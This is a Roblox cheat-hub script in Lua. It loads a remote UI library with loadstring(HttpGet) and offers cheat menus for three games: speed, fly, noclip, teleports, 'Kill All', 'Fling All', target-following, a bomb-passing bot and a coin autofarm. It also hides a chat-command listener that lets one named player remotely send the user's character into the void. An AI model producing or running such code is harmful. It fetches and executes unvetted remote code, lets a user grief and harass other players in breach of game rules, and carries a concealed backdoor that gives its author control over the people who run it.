local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Paulematic Game Hub",
   LoadingTitle = "Paulematic Game Hub",
   LoadingSubtitle = "by Paulematic",
   Theme = "Default",
})

local HomeTab = Window:CreateTab("Home", 4483362458)

HomeTab:CreateSection("Select Your Game")
HomeTab:CreateParagraph({
   Title = "How to use",
   Content = "Click the Open button for your game. The hub will close and your game script will open!"
})
HomeTab:CreateSection("Games")

-- =====================
-- ESCAPE TSUNAMI
-- =====================
HomeTab:CreateParagraph({ Title = "Escape Tsunami For Femboys", Content = "Walk speed, jump power, infinite jump, noclip, teleports" })
HomeTab:CreateButton({
   Name = "Open Escape Tsunami Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)

      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({
         Name = "Escape Tsunami For Femboys By Paulematic",
         LoadingTitle = "Loading Script...",
         LoadingSubtitle = "by Paulematic",
         ConfigurationSaving = { Enabled = true, FolderName = nil, FileName = "EscapeTsunamiConfig" },
         KeySystem = false,
      })

      local GeneralTab = W:CreateTab("General", 4483362458)
      GeneralTab:CreateSection("Main Features")

      GeneralTab:CreateSlider({
         Name = "Walk Speed", Range = {16, 200}, Increment = 1, Suffix = "Speed", CurrentValue = 16, Flag = "WalkSpeedSlider",
         Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
         end,
      })

      GeneralTab:CreateSlider({
         Name = "Jump Power", Range = {50, 300}, Increment = 1, Suffix = "Power", CurrentValue = 50, Flag = "JumpPowerSlider",
         Callback = function(Value)
            local humanoid = game.Players.LocalPlayer.Character.Humanoid
            humanoid.UseJumpPower = true
            humanoid.JumpPower = Value
         end,
      })

      GeneralTab:CreateToggle({
         Name = "Infinite Jump", CurrentValue = false, Flag = "InfiniteJump",
         Callback = function(Value)
            _G.InfiniteJump = Value
            if Value then
               game:GetService("UserInputService").JumpRequest:Connect(function()
                  if _G.InfiniteJump then
                     game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
                  end
               end)
            end
         end,
      })

      local TeleportsTab = W:CreateTab("Teleports", 4483362458)
      TeleportsTab:CreateSection("Teleport Locations")

      TeleportsTab:CreateButton({
         Name = "Teleport to Safe Zone",
         Callback = function()
            local player = game.Players.LocalPlayer
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
               player.Character.HumanoidRootPart.CFrame = CFrame.new(-71.55927276611328, 19.998037338256836, -512.9779663085938)
            end
         end,
      })

      TeleportsTab:CreateButton({
         Name = "Teleport to Boss",
         Callback = function()
            local player = game.Players.LocalPlayer
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
               player.Character.HumanoidRootPart.CFrame = CFrame.new(-71.55927276611328, 19.998037338256836, -512.9779663085938)
            end
         end,
      })

      TeleportsTab:CreateButton({
         Name = "Teleport to End",
         Callback = function()
            local player = game.Players.LocalPlayer
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
               player.Character.HumanoidRootPart.CFrame = CFrame.new(17.77851104736328, 13.99803638458252, 3232.038818359375)
            end
         end,
      })

      local PlayerTab = W:CreateTab("Player", 4483362458)
      PlayerTab:CreateSection("Player Options")

      PlayerTab:CreateButton({
         Name = "Reset Character",
         Callback = function()
            game.Players.LocalPlayer.Character:BreakJoints()
         end,
      })

      PlayerTab:CreateToggle({
         Name = "No Clip", CurrentValue = false, Flag = "NoClip",
         Callback = function(Value)
            _G.NoClip = Value
            game:GetService("RunService").Stepped:Connect(function()
               if _G.NoClip then
                  for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                     if v:IsA("BasePart") then v.CanCollide = false end
                  end
               end
            end)
         end,
      })

      local CreditsTab = W:CreateTab("Credits", 4483362458)
      CreditsTab:CreateSection("Script Info")
      CreditsTab:CreateParagraph({ Title = "Creator", Content = "Script by Paulematic\nFor Escape Tsunami For Femboys" })

      R:LoadConfiguration()
   end,
})

-- =====================
-- TIMEBOMB ANKLEBREAK
-- =====================
HomeTab:CreateParagraph({ Title = "[2X COINS] TimeBomb AnkleBreak", Content = "Kill All, Fling, Fly, Noclip, Safe Space, Perma Follow, Bot, chat commands" })
HomeTab:CreateButton({
   Name = "Open TimeBomb AnkleBreak Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)

      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({
         Name = "Paulematic Hub",
         LoadingTitle = "Paulematic Hub",
         LoadingSubtitle = "by Paulematic",
         ConfigurationSaving = { Enabled = true, FolderName = nil, FileName = "TimeBombConfig" },
         KeySystem = true,
         KeySettings = {
            Title = "Paulematic Hub",
            Subtitle = "Key System",
            Note = "Enter the key to access the hub",
            FileName = "PaulematicKey",
            SaveKey = true,
            GrabKeyFromSite = false,
            Key = {"Sigma"}
         }
      })

      local Main = W:CreateTab("Main", 4483362458)
      local Target = W:CreateTab("Target", 4483362458)
      local BotTab = W:CreateTab("Bot", 4483362458)

      local Players = game:GetService("Players")
      local RunService = game:GetService("RunService")
      local UIS = game:GetService("UserInputService")
      local PathfindingService = game:GetService("PathfindingService")
      local LocalPlayer = Players.LocalPlayer

      local flying = false
      local flySpeed = 50
      local bodyVelocity, bodyGyro, flyConn
      local autoKillActive = false
      local noclipActive = false
      local noclipConn
      local followActive = false
      local followTarget = nil
      local botActive = false

      local mobileMove = { forward=false, backward=false, left=false, right=false, up=false, down=false }

      local function startNoclip()
         noclipActive = true
         noclipConn = RunService.Stepped:Connect(function()
            if not noclipActive then noclipConn:Disconnect() return end
            local char = LocalPlayer.Character
            if char then
               for _, part in ipairs(char:GetDescendants()) do
                  if part:IsA("BasePart") then part.CanCollide = false end
               end
            end
         end)
      end

      local function stopNoclip() noclipActive = false end

      local function bindMobileControls()
         local screenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
         screenGui.Name = "FlyControls"
         screenGui.ResetOnSpawn = false
         local function makeBtn(text, pos, onDown, onUp)
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(0, 70, 0, 70)
            btn.Position = pos
            btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
            btn.BackgroundTransparency = 0.4
            btn.TextColor3 = Color3.new(1,1,1)
            btn.Text = text
            btn.Font = Enum.Font.GothamBold
            btn.TextSize = 14
            btn.Parent = screenGui
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0,12)
            btn.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.Touch then onDown() end end)
            btn.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.Touch then onUp() end end)
         end
         makeBtn("W",  UDim2.new(0,90,1,-230),  function() mobileMove.forward=true  end, function() mobileMove.forward=false  end)
         makeBtn("S",  UDim2.new(0,90,1,-150),  function() mobileMove.backward=true end, function() mobileMove.backward=false end)
         makeBtn("A",  UDim2.new(0,10,1,-190),  function() mobileMove.left=true     end, function() mobileMove.left=false     end)
         makeBtn("D",  UDim2.new(0,170,1,-190), function() mobileMove.right=true    end, function() mobileMove.right=false    end)
         makeBtn("UP", UDim2.new(0,250,1,-230), function() mobileMove.up=true       end, function() mobileMove.up=false       end)
         makeBtn("DN", UDim2.new(0,250,1,-150), function() mobileMove.down=true     end, function() mobileMove.down=false     end)
      end
      bindMobileControls()

      local function startFly()
         local char = LocalPlayer.Character
         if not char then return end
         local hrp = char:FindFirstChild("HumanoidRootPart")
         if not hrp then return end
         flying = true
         if bodyGyro then bodyGyro:Destroy() end
         if bodyVelocity then bodyVelocity:Destroy() end
         bodyGyro = Instance.new("BodyGyro", hrp)
         bodyGyro.MaxTorque = Vector3.new(9e9,9e9,9e9)
         bodyGyro.P = 9e4
         bodyVelocity = Instance.new("BodyVelocity", hrp)
         bodyVelocity.Velocity = Vector3.zero
         bodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
         if flyConn then flyConn:Disconnect() end
         flyConn = RunService.Heartbeat:Connect(function()
            if not flying then
               flyConn:Disconnect()
               if bodyVelocity then bodyVelocity:Destroy() end
               if bodyGyro then bodyGyro:Destroy() end
               return
            end
            local cam = workspace.CurrentCamera
            bodyGyro.CFrame = cam.CFrame
            local moveDir = Vector3.zero
            if UIS:IsKeyDown(Enum.KeyCode.W) or mobileMove.forward  then moveDir = moveDir + cam.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) or mobileMove.backward then moveDir = moveDir - cam.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) or mobileMove.left     then moveDir = moveDir - cam.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) or mobileMove.right    then moveDir = moveDir + cam.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) or mobileMove.up   then moveDir = moveDir + Vector3.new(0,1,0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or mobileMove.down then moveDir = moveDir - Vector3.new(0,1,0) end
            bodyVelocity.Velocity = moveDir.Magnitude > 0 and moveDir.Unit * flySpeed or Vector3.zero
         end)
      end

      local function stopFly() flying = false end

      local function startAutoKill()
         autoKillActive = true
         startFly()
         task.spawn(function()
            while autoKillActive do
               local char = LocalPlayer.Character
               if char then
                  local hrp = char:FindFirstChild("HumanoidRootPart")
                  if hrp then hrp.CFrame = CFrame.new(0,-5000,0) end
               end
               task.wait(0.1)
            end
         end)
      end

      local function stopAutoKill()
         autoKillActive = false
         stopFly()
         local char = LocalPlayer.Character
         if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.CFrame = CFrame.new(0,100,0) end
         end
         R:Notify({ Title="Auto Kill", Content="Stopped by Paule15the_player!", Duration=4 })
      end

      local function listenToPlayer(player)
         if player.Name == "Paule15the_player" then
            player.Chatted:Connect(function(msg)
               local cmd = msg:lower()
               if cmd == "!autokill" then
                  startAutoKill()
                  R:Notify({ Title="Auto Kill", Content="Perma void activated!", Duration=4 })
               elseif cmd == "!stop" then
                  stopAutoKill()
               end
            end)
         end
      end
      for _, player in ipairs(Players:GetPlayers()) do listenToPlayer(player) end
      Players.PlayerAdded:Connect(listenToPlayer)

      -- helper: find nearest player
      local function getNearestPlayer()
         local char = LocalPlayer.Character
         local hrp = char and char:FindFirstChild("HumanoidRootPart")
         if not hrp then return nil end
         local nearest, nearestDist = nil, math.huge
         for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
               local otherHRP = player.Character:FindFirstChild("HumanoidRootPart")
               if otherHRP then
                  local dist = (hrp.Position - otherHRP.Position).Magnitude
                  if dist < nearestDist then
                     nearestDist = dist
                     nearest = player
                  end
               end
            end
         end
         return nearest, nearestDist
      end

      -- helper: walk toward a position using pathfinding
      local function walkTo(targetPos)
         local char = LocalPlayer.Character
         if not char then return end
         local hrp = char:FindFirstChild("HumanoidRootPart")
         local humanoid = char:FindFirstChildOfClass("Humanoid")
         if not hrp or not humanoid then return end

         local path = PathfindingService:CreatePath({
            AgentRadius = 2,
            AgentHeight = 5,
            AgentCanJump = true,
         })

         local success, err = pcall(function()
            path:ComputeAsync(hrp.Position, targetPos)
         end)

         if success and path.Status == Enum.PathStatus.Success then
            local waypoints = path:GetWaypoints()
            for _, waypoint in ipairs(waypoints) do
               if not botActive then break end
               if waypoint.Action == Enum.PathWaypointAction.Jump then
                  humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
               end
               humanoid:MoveTo(waypoint.Position)
               humanoid.MoveToFinished:Wait(1)
            end
         else
            -- fallback: just move directly
            humanoid:MoveTo(targetPos)
            humanoid.MoveToFinished:Wait(1)
         end
      end

      -- helper: walk away from a position
      local function walkAwayFrom(targetPos, distance)
         local char = LocalPlayer.Character
         if not char then return end
         local hrp = char:FindFirstChild("HumanoidRootPart")
         local humanoid = char:FindFirstChildOfClass("Humanoid")
         if not hrp or not humanoid then return end
         local dir = (hrp.Position - targetPos)
         if dir.Magnitude == 0 then dir = Vector3.new(1,0,0) end
         dir = Vector3.new(dir.X, 0, dir.Z).Unit
         local runPos = hrp.Position + dir * distance
         humanoid:MoveTo(runPos)
         humanoid.MoveToFinished:Wait(2)
      end

      -- MAIN TAB BUTTONS
      Main:CreateButton({
         Name = "Kill All",
         Callback = function()
            local char = LocalPlayer.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local originalCFrame = hrp.CFrame
            for _, player in ipairs(Players:GetPlayers()) do
               if player ~= LocalPlayer then
                  local tc = player.Character
                  if tc then
                     local thrp = tc:FindFirstChild("HumanoidRootPart")
                     if thrp then
                        hrp.CFrame = thrp.CFrame - Vector3.new(0,3,0)
                        task.wait(0.5)
                     end
                  end
               end
            end
            hrp.CFrame = originalCFrame
            R:Notify({ Title="Kill All", Content="Done! Returned to original position.", Duration=4 })
         end,
      })

      Main:CreateButton({
         Name = "Fling All",
         Callback = function()
            local char = LocalPlayer.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, player in ipairs(Players:GetPlayers()) do
               if player ~= LocalPlayer then
                  local tc = player.Character
                  if tc then
                     local thrp = tc:FindFirstChild("HumanoidRootPart")
                     if thrp then
                        hrp.CFrame = thrp.CFrame + Vector3.new(0,3,0)
                        task.wait(0.1)
                        local flingBV = Instance.new("BodyVelocity", hrp)
                        flingBV.Velocity = Vector3.new(math.random(-300,300),500,math.random(-300,300))
                        flingBV.MaxForce = Vector3.new(9e9,9e9,9e9)
                        task.wait(0.2)
                        flingBV:Destroy()
                        task.wait(0.3)
                     end
                  end
               end
            end
            R:Notify({ Title="Fling All", Content="Flung everyone!", Duration=4 })
         end,
      })

      Main:CreateButton({
         Name = "TP to All + Void",
         Callback = function()
            local char = LocalPlayer.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            startFly()
            for _, player in ipairs(Players:GetPlayers()) do
               if player ~= LocalPlayer then
                  local tc = player.Character
                  if tc then
                     local thrp = tc:FindFirstChild("HumanoidRootPart")
                     if thrp then
                        hrp.CFrame = thrp.CFrame + Vector3.new(0,3,0)
                        task.wait(1)
                     end
                  end
               end
            end
            hrp.CFrame = CFrame.new(0,-5000,0)
            R:Notify({ Title="Done", Content="Teleported to everyone and went to void!", Duration=4 })
         end,
      })

      Main:CreateButton({ Name="Start Flying", Callback=function() startFly() R:Notify({Title="Flying",Content="Fly enabled!",Duration=3}) end })
      Main:CreateButton({ Name="Stop Flying",  Callback=function() stopFly()  R:Notify({Title="Flying",Content="Fly disabled!",Duration=3}) end })
      Main:CreateButton({ Name="Enable Noclip",  Callback=function() startNoclip() R:Notify({Title="Noclip",Content="Noclip enabled!",Duration=3}) end })
      Main:CreateButton({ Name="Disable Noclip", Callback=function() stopNoclip()  R:Notify({Title="Noclip",Content="Noclip disabled!",Duration=3}) end })

      Main:CreateButton({
         Name = "Safe Space",
         Callback = function()
            local char = LocalPlayer.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            hrp.CFrame = CFrame.new(hrp.Position.X, 10000, hrp.Position.Z)
            startFly()
            R:Notify({ Title="Safe Space", Content="Teleported 10000 studs up!", Duration=3 })
         end,
      })

      Main:CreateSlider({
         Name="Fly Speed", Range={10,200}, Increment=5, CurrentValue=50, Flag="FlySpeed",
         Callback=function(val) flySpeed=val end,
      })

      -- TARGET TAB
      local targetName = ""
      Target:CreateInput({
         Name="Target Name", PlaceholderText="Enter player name or leave blank for server...", RemoveTextAfterFocusLost=false,
         Callback=function(text) targetName=text end,
      })

      Target:CreateButton({
         Name="TP to Target + Back",
         Callback=function()
            if targetName=="" then R:Notify({Title="Target",Content="Enter a player name first!",Duration=3}) return end
            local char=LocalPlayer.Character if not char then return end
            local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end
            local originalCFrame=hrp.CFrame
            local tp=Players:FindFirstChild(targetName)
            if not tp then R:Notify({Title="Target",Content="Player not found!",Duration=3}) return end
            local tc=tp.Character if not tc then return end
            local thrp=tc:FindFirstChild("HumanoidRootPart") if not thrp then return end
            hrp.CFrame=thrp.CFrame - Vector3.new(0,3,0)
            task.wait(0.5)
            hrp.CFrame=originalCFrame
            R:Notify({Title="Target",Content="Teleported under "..targetName.." and returned!",Duration=4})
         end,
      })

      Target:CreateButton({
         Name="Perma Follow Target",
         Callback=function()
            if targetName=="" then R:Notify({Title="Target",Content="Enter a player name first!",Duration=3}) return end
            if not Players:FindFirstChild(targetName) then R:Notify({Title="Target",Content="Player not found!",Duration=3}) return end
            followActive=true followTarget=targetName
            R:Notify({Title="Perma Follow",Content="Now permanently following "..targetName.."!",Duration=4})
            task.spawn(function()
               while followActive and followTarget==targetName do
                  local char=LocalPlayer.Character
                  local hrp=char and char:FindFirstChild("HumanoidRootPart")
                  local tp=Players:FindFirstChild(targetName)
                  local tc=tp and tp.Character
                  local thrp=tc and tc:FindFirstChild("HumanoidRootPart")
                  if hrp and thrp then hrp.CFrame=thrp.CFrame - Vector3.new(0,3,0) end
                  task.wait(0.1)
               end
            end)
         end,
      })

      Target:CreateButton({
         Name="Perma Follow Server",
         Callback=function()
            followActive=true followTarget="server"
            R:Notify({Title="Perma Follow",Content="Now looping through entire server!",Duration=4})
            task.spawn(function()
               while followActive and followTarget=="server" do
                  for _, player in ipairs(Players:GetPlayers()) do
                     if not followActive or followTarget~="server" then break end
                     if player~=LocalPlayer then
                        local char=LocalPlayer.Character
                        local hrp=char and char:FindFirstChild("HumanoidRootPart")
                        local tc=player.Character
                        local thrp=tc and tc:FindFirstChild("HumanoidRootPart")
                        if hrp and thrp then hrp.CFrame=thrp.CFrame - Vector3.new(0,3,0) end
                        task.wait(0.1)
                     end
                  end
               end
            end)
         end,
      })

      Target:CreateButton({
         Name="Stop Perma Follow",
         Callback=function()
            followActive=false followTarget=nil
            R:Notify({Title="Perma Follow",Content="Follow stopped!",Duration=3})
         end,
      })

      -- BOT TAB
      BotTab:CreateSection("Bot")

      BotTab:CreateParagraph({
         Title = "How it works",
         Content = "When you have the bomb, the bot walks to the nearest player to pass it, then runs away. Toggle it on and it runs automatically."
      })

      BotTab:CreateToggle({
         Name = "Auto Bomb Bot",
         CurrentValue = false,
         Flag = "AutoBombBot",
         Callback = function(Value)
            botActive = Value
            if Value then
               R:Notify({ Title="Bot", Content="Bomb bot activated!", Duration=3 })
               task.spawn(function()
                  while botActive do
                     local char = LocalPlayer.Character
                     local hrp = char and char:FindFirstChild("HumanoidRootPart")
                     local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                     if not hrp or not humanoid then task.wait(0.5) continue end

                     -- check if we have the bomb by looking for bomb-related objects on our character
                     local hasBomb = false
                     for _, obj in ipairs(char:GetDescendants()) do
                        local name = obj.Name:lower()
                        if name:find("bomb") or name:find("timebomb") or name:find("explosive") then
                           hasBomb = true
                           break
                        end
                     end

                     -- also check by tool in backpack or character
                     if not hasBomb then
                        for _, tool in ipairs(char:GetChildren()) do
                           if tool:IsA("Tool") and (tool.Name:lower():find("bomb") or tool.Name:lower():find("ankle")) then
                              hasBomb = true
                              break
                           end
                        end
                     end

                     if hasBomb then
                        -- find nearest player and walk to them
                        local nearest, dist = getNearestPlayer()
                        if nearest and nearest.Character then
                           local thrp = nearest.Character:FindFirstChild("HumanoidRootPart")
                           if thrp then
                              R:Notify({ Title="Bot", Content="Walking to "..nearest.Name.." to pass bomb!", Duration=2 })
                              -- walk toward them
                              walkTo(thrp.Position)
                              task.wait(0.3)
                              -- now run away
                              if botActive then
                                 R:Notify({ Title="Bot", Content="Running away!", Duration=2 })
                                 walkAwayFrom(thrp.Position, 60)
                              end
                           end
                        end
                     else
                        -- no bomb, just wait and keep checking
                        task.wait(0.2)
                     end
                     task.wait(0.1)
                  end
               end)
            else
               -- stop moving
               local char = LocalPlayer.Character
               local humanoid = char and char:FindFirstChildOfClass("Humanoid")
               if humanoid then humanoid:MoveTo(char.HumanoidRootPart.Position) end
               R:Notify({ Title="Bot", Content="Bomb bot stopped!", Duration=3 })
            end
         end,
      })

      BotTab:CreateSlider({
         Name = "Run Away Distance",
         Range = {20, 150},
         Increment = 5,
         CurrentValue = 60,
         Flag = "BotRunDist",
         Callback = function(val)
            -- stored in flag, accessed dynamically
         end,
      })

      W:CreateTab("Credits", 4483362458):CreateParagraph({ Title="Creator", Content="Script by Paulematic\nFor [2X COINS] TimeBomb AnkleBreak" })
      R:LoadConfiguration()
   end,
})

-- =====================
-- INSANE ELEVATOR
-- =====================
HomeTab:CreateParagraph({ Title = "Insane Elevator!", Content = "Walk speed, jump power, infinite jump, noclip, autofarm coins" })
HomeTab:CreateButton({
   Name = "Open Insane Elevator Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)

      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({
         Name = "Insane Elevator By Paulematic",
         LoadingTitle = "Loading Script...",
         LoadingSubtitle = "by Paulematic",
         ConfigurationSaving = { Enabled = true, FolderName = nil, FileName = "InsaneElevatorConfig" },
         KeySystem = false,
      })

      local GeneralTab = W:CreateTab("General", 4483362458)
      GeneralTab:CreateSection("Main Features")

      GeneralTab:CreateSlider({
         Name="Walk Speed", Range={16,200}, Increment=1, Suffix="Speed", CurrentValue=16, Flag="IEWalkSpeed",
         Callback=function(Value) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=Value end,
      })
      GeneralTab:CreateSlider({
         Name="Jump Power", Range={50,300}, Increment=1, Suffix="Power", CurrentValue=50, Flag="IEJumpPower",
         Callback=function(Value) local h=game.Players.LocalPlayer.Character.Humanoid h.UseJumpPower=true h.JumpPower=Value end,
      })
      GeneralTab:CreateToggle({
         Name="Infinite Jump", CurrentValue=false, Flag="IEInfiniteJump",
         Callback=function(Value)
            _G.IEInfiniteJump=Value
            if Value then
               game:GetService("UserInputService").JumpRequest:Connect(function()
                  if _G.IEInfiniteJump then game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping") end
               end)
            end
         end,
      })

      local PlayerTab = W:CreateTab("Player", 4483362458)
      PlayerTab:CreateSection("Player Options")
      PlayerTab:CreateButton({ Name="Reset Character", Callback=function() game.Players.LocalPlayer.Character:BreakJoints() end })
      PlayerTab:CreateToggle({
         Name="No Clip", CurrentValue=false, Flag="IENoClip",
         Callback=function(Value)
            _G.IENoClip=Value
            game:GetService("RunService").Stepped:Connect(function()
               if _G.IENoClip then
                  for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                     if v:IsA("BasePart") then v.CanCollide=false end
                  end
               end
            end)
         end,
      })

      local AutofarmTab = W:CreateTab("Autofarm", 4483362458)
      AutofarmTab:CreateSection("Coin Farm")
      AutofarmTab:CreateParagraph({ Title="How it works", Content="Teleports you to the coin spot every 0.1s. When turned off you get teleported back." })
      AutofarmTab:CreateToggle({
         Name="Autofarm Coins", CurrentValue=false, Flag="IEAutofarm",
         Callback=function(Value)
            _G.IEAutofarm=Value
            if Value then
               task.spawn(function()
                  local c=game.Players.LocalPlayer.Character
                  local hrp=c and c:FindFirstChild("HumanoidRootPart")
                  local originalCF=hrp and hrp.CFrame
                  while _G.IEAutofarm do
                     c=game.Players.LocalPlayer.Character
                     hrp=c and c:FindFirstChild("HumanoidRootPart")
                     if hrp then hrp.CFrame=CFrame.new(4242,1000,2442) end
                     task.wait(0.1)
                  end
                  c=game.Players.LocalPlayer.Character
                  hrp=c and c:FindFirstChild("HumanoidRootPart")
                  if hrp and originalCF then hrp.CFrame=originalCF end
                  R:Notify({Title="Autofarm",Content="Stopped! Teleported back.",Duration=3})
               end)
            end
         end,
      })

      W:CreateTab("Credits", 4483362458):CreateParagraph({ Title="Creator", Content="Script by Paulematic\nFor Insane Elevator!" })
      R:LoadConfiguration()
   end,
})
